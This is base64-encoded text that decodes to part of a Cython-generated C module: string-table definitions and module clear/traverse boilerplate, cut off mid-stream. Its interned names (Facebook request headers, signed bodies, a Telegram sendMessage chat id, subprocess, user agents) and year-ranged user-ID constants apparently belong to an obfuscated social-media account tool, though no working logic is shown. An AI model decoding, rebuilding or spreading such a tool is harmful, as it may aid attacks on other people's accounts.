ZSBfX3B5eF9zdHJpbmdfdGFiWzMwN11cbiNkZWZpbmUgX19weXhfbl91X3JlYWQgX19weXhfc3RyaW5nX3RhYlszMDhdXG4jZGVmaW5lIF9fcHl4X25fdV9yZWQgX19weXhfc3RyaW5nX3RhYlszMDldXG4jZGVmaW5lIF9fcHl4X25fdV9yZWZlcmVyIF9fcHl4X3N0cmluZ190YWJbMzEwXVxuI2RlZmluZSBfX3B5eF9uX3VfcmVuZGVyIF9fcHl4X3N0cmluZ190YWJbMzExXVxuI2RlZmluZSBfX3B5eF9uX3VfcmVxdWVzdHMgX19weXhfc3RyaW5nX3RhYlszMTJdXG4jZGVmaW5lIF9fcHl4X25fdV9yZXMxIF9fcHl4X3N0cmluZ190YWJbMzEzXVxuI2RlZmluZSBfX3B5eF9uX3VfcmVzcG9uc2UgX19weXhfc3RyaW5nX3RhYlszMTRdXG4jZGVmaW5lIF9fcHl4X25fdV9yZXN0IF9fcHl4X3N0cmluZ190YWJbMzE1XVxuI2RlZmluZSBfX3B5eF9uX3VfcmljaF9jb25zb2xlIF9fcHl4X3N0cmluZ190YWJbMzE2XVxuI2RlZmluZSBfX3B5eF9uX3VfcmljaF9wYW5lbCBfX3B5eF9zdHJpbmdfdGFiWzMxN11cbiNkZWZpbmUgX19weXhfbl91X3JuZCBfX3B5eF9zdHJpbmdfdGFiWzMxOF1cbiNkZWZpbmUgX19weXhfbl91X3JyIF9fcHl4X3N0cmluZ190YWJbMzE5XVxuI2RlZmluZSBfX3B5eF9uX3Vfc2VhcmNoIF9fcHl4X3N0cmluZ190YWJbMzIwXVxuI2RlZmluZSBfX3B5eF9uX3Vfc2VuZCBfX3B5eF9zdHJpbmdfdGFiWzMyMV1cbiNkZWZpbmUgX19weXhfa3BfdV9zZW5kTWVzc2FnZV9jaGF0X2lkIF9fcHl4X3N0cmluZ190YWJbMzIyXVxuI2RlZmluZSBfX3B5eF9uX3Vfc2VydmVyX3RpbWVzdGFtcHMgX19weXhfc3RyaW5nX3RhYlszMjNdXG4jZGVmaW5lIF9fcHl4X25fdV9zZXRfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzMyNF1cbiNkZWZpbmUgX19weXhfbl91X3NpZ25lZF9ib2R5IF9fcHl4X3N0cmluZ190YWJbMzI1XVxuI2RlZmluZSBfX3B5eF9uX3Vfc2xlZXAgX19weXhfc3RyaW5nX3RhYlszMjZdXG4jZGVmaW5lIF9fcHl4X25fdV9zcGFjZSBfX3B5eF9zdHJpbmdfdGFiWzMyN11cbiNkZWZpbmUgX19weXhfbl91X3NwZWMgX19weXhfc3RyaW5nX3RhYlszMjhdXG4jZGVmaW5lIF9fcHl4X25fdV9zcGxpdCBfX3B5eF9zdHJpbmdfdGFiWzMyOV1cbiNkZWZpbmUgX19weXhfbl91X3NwbGl0bGluZXMgX19weXhfc3RyaW5nX3RhYlszMzBdXG4jZGVmaW5lIF9fcHl4X25fdV9zcyBfX3B5eF9zdHJpbmdfdGFiWzMzMV1cbiNkZWZpbmUgX19weXhfbl91X3N0YXJ0IF9fcHl4X3N0cmluZ190YWJbMzMyXVxuI2RlZmluZSBfX3B5eF9uX3Vfc3Rkb3V0IF9fcHl4X3N0cmluZ190YWJbMzMzXVxuI2RlZmluZSBfX3B5eF9uX3Vfc3VicHJvY2VzcyBfX3B5eF9zdHJpbmdfdGFiWzMzNF1cbiNkZWZpbmUgX19weXhfbl91X3N5cyBfX3B5eF9zdHJpbmdfdGFiWzMzNV1cbiNkZWZpbmUgX19weXhfbl91X3N5c3RlbSBfX3B5eF9zdHJpbmdfdGFiWzMzNl1cbiNkZWZpbmUgX19weXhfbl91X3QgX19weXhfc3RyaW5nX3RhYlszMzddXG4jZGVmaW5lIF9fcHl4X25fdV90YXJnZXQgX19weXhfc3RyaW5nX3RhYlszMzhdXG4jZGVmaW5lIF9fcHl4X25fdV90ZXN0IF9fcHl4X3N0cmluZ190YWJbMzM5XVxuI2RlZmluZSBfX3B5eF9uX3VfdGV4dCBfX3B5eF9zdHJpbmdfdGFiWzM0MF1cbiNkZWZpbmUgX19weXhfa3BfdV90ZXh0XzIgX19weXhfc3RyaW5nX3RhYlszNDFdXG4jZGVmaW5lIF9fcHl4X25fdV90aHJlYWRpbmcgX19weXhfc3RyaW5nX3RhYlszNDJdXG4jZGVmaW5lIF9fcHl4X25fdV90aHJlYWRzIF9fcHl4X3N0cmluZ190YWJbMzQzXVxuI2RlZmluZSBfX3B5eF9uX3VfdGhyb3cgX19weXhfc3RyaW5nX3RhYlszNDRdXG4jZGVmaW5lIF9fcHl4X25fdV90aW1lIF9fcHl4X3N0cmluZ190YWJbMzQ1XVxuI2RlZmluZSBfX3B5eF9uX3VfdGwgX19weXhfc3RyaW5nX3RhYlszNDZdXG4jZGVmaW5lIF9fcHl4X2twX3VfdGxfdHh0IF9fcHl4X3N0cmluZ190YWJbMzQ3XVxuI2RlZmluZSBfX3B5eF9uX3VfdGxsIF9fcHl4X3N0cmluZ190YWJbMzQ4XVxuI2RlZmluZSBfX3B5eF9uX3VfdGxsX2xvY2Fsc19nZW5leHByIF9fcHl4X3N0cmluZ190YWJbMzQ5XVxuI2RlZmluZSBfX3B5eF9uX3VfdG9rIF9fcHl4X3N0cmluZ190YWJbMzUwXVxuI2RlZmluZSBfX3B5eF9uX3VfdG90YWwgX19weXhfc3RyaW5nX3RhYlszNTFdXG4jZGVmaW5lIF9fcHl4X25fdV90cnVlIF9fcHl4X3N0cmluZ190YWJbMzUyXVxuI2RlZmluZSBfX3B5eF9rcF91X3VfMV9pIF9fcHl4X3N0cmluZ190YWJbMzUzXVxuI2RlZmluZSBfX3B5eF9uX3VfdWEgX19weXhfc3RyaW5nX3RhYlszNTRdXG4jZGVmaW5lIF9fcHl4X25fdV91aWQgX19weXhfc3RyaW5nX3RhYlszNTVdXG4jZGVmaW5lIF9fcHl4X25fdV91c2VyIF9fcHl4X3N0cmluZ190YWJbMzU2XVxuI2RlZmluZSBfX3B5eF9rcF91X3VzZXJJRCBfX3B5eF9zdHJpbmdfdGFiWzM1N11cbiNkZWZpbmUgX19weXhfa3BfdV91c2VyX2FnZW50IF9fcHl4X3N0cmluZ190YWJbMzU4XVxuI2RlZmluZSBfX3B5eF9uX3VfdXNlcl9hZ2VudF8yIF9fcHl4X3N0cmluZ190YWJbMzU5XVxuI2RlZmluZSBfX3B5eF9uX3VfdXNlcm5hbWUgX19weXhfc3RyaW5nX3RhYlszNjBdXG4jZGVmaW5lIF9fcHl4X2twX3VfdXNlcm5hbWVfY3Jpc3RpYW5vIF9fcHl4X3N0cmluZ190YWJbMzYxXVxuI2RlZmluZSBfX3B5eF9rcF91X3V0Zl84IF9fcHl4X3N0cmluZ190YWJbMzYyXVxuI2RlZmluZSBfX3B5eF9uX3VfdXRpbCBfX3B5eF9zdHJpbmdfdGFiWzM2M11cbiNkZWZpbmUgX19weXhfbl91X3V1aSBfX3B5eF9zdHJpbmdfdGFiWzM2NF1cbiNkZWZpbmUgX19weXhfbl91X3V1aWQgX19weXhfc3RyaW5nX3RhYlszNjVdXG4jZGVmaW5lIF9fcHl4X25fdV91dWlkNCBfX3B5eF9zdHJpbmdfdGFiWzM2Nl1cbiNkZWZpbmUgX19weXhfbl91X3V1dSBfX3B5eF9zdHJpbmdfdGFiWzM2N11cbiNkZWZpbmUgX19weXhfbl91X3V1dV9sb2NhbHNfZ2VuZXhwciBfX3B5eF9zdHJpbmdfdGFiWzM2OF1cbiNkZWZpbmUgX19weXhfbl91X3ZhbHVlIF9fcHl4X3N0cmluZ190YWJbMzY5XVxuI2RlZmluZSBfX3B5eF9uX3VfdmFyaWFibGVzIF9fcHl4X3N0cmluZ190YWJbMzcwXVxuI2RlZmluZSBfX3B5eF9uX3VfdyBfX3B5eF9zdHJpbmdfdGFiWzM3MV1cbiNkZWZpbmUgX19weXhfbl91X3dlYmJyb3dzZXIgX19weXhfc3RyaW5nX3RhYlszNzJdXG4jZGVmaW5lIF9fcHl4X25fdV93cml0ZSBfX3B5eF9zdHJpbmdfdGFiWzM3M11cbiNkZWZpbmUgX19weXhfbl91X3ggX19weXhfc3RyaW5nX3RhYlszNzRdXG4jZGVmaW5lIF9fcHl4X2twX3VfeF9mYl9mcmllbmRseV9uYW1lIF9fcHl4X3N0cmluZ190YWJbMzc1XVxuI2RlZmluZSBfX3B5eF9rcF91X3hfZmJfbHNkIF9fcHl4X3N0cmluZ190YWJbMzc2XVxuI2RlZmluZSBfX3B5eF9uX3VfeXkgX19weXhfc3RyaW5nX3RhYlszNzddXG5cbiNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9tX2NsZWFyKFB5T2JqZWN0ICptKSB7XG4gIF9fcHl4X21zdGF0ZXR5cGUgKmNsZWFyX21vZHVsZV9zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG0pO1xuICBpZiAoIWNsZWFyX21vZHVsZV9zdGF0ZSkgcmV0dXJuIDA7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfYik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSk7XG4gICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRURcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSk7XG4gICNlbmRpZlxuICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VEXG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfRnVzZWRGdW5jdGlvblR5cGUpO1xuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoTlVMTCk7XG4gICNlbmRpZlxuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7XG4gIGZvciAoaW50IGk9MDsgaTwxOyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9zbGljZVtpXSk7IH1cbiAgZm9yIChpbnQgaT0wOyBpPDI0OyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90dXBsZVtpXSk7IH1cbiAgZm9yIChpbnQgaT0wOyBpPDE1OyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jb2Rlb2JqX3RhYltpXSk7IH1cbiAgZm9yIChpbnQgaT0wOyBpPDM3ODsgKytpKSB7IFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfc3RyaW5nX3RhYltpXSk7IH1cbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMyk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzUpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF82KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTEpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE2KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMzApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMTEpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNTApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDgpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85OTkpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTMwMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxMSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEzKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxNCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTUpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE2KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxNyk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTgpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE5KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwMDAwMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEyNzkwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAxKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE2MjkwMTAwMDApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xOTAwMDAwMDAwKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzM3MTM2Njg3ODYpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF81Njk5Nzg1MjE3KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIxMjU0MDI5ODM0KTtcbiAgcmV0dXJuIDA7XG59XG4jZW5kaWZcblxuI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fcHl4X21fdHJhdmVyc2UoUHlPYmplY3QgKm0sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7XG4gIF9fcHl4X21zdGF0ZXR5cGUgKnRyYXZlcnNlX21vZHVsZV9zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG0pO1xuICBpZiAoIXRyYXZlcnNlX21vZHVsZV9zdGF0ZSkgcmV0dXJuIDA7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZCk7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfYik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSk7XG4gICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRURcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSk7XG4gICNlbmRpZlxuICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VEXG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfRnVzZWRGdW5jdGlvblR5cGUpO1xuICAjZW5kaWZcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpO1xuICBmb3IgKGludCBpPTA7IGk8MTsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfc2xpY2VbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTwyNDsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHVwbGVbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTwxNTsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY29kZW9ial90YWJbaV0pOyB9XG4gIGZvciAoaW50IGk9MDsgaTwzNzg7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3N0cmluZ190YWJbaV0pOyB9XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMik7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF81KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNik7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzExKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTUpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNik7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTExKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTUwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjA4KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTk5KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEzMDApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxMCk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTEpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEyKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxMyk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTQpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE1KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxNik7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwMTcpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE4KTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjAxOSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwMDAwMDApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE3NzUwMDAwKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzk3NjAwMDEpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTA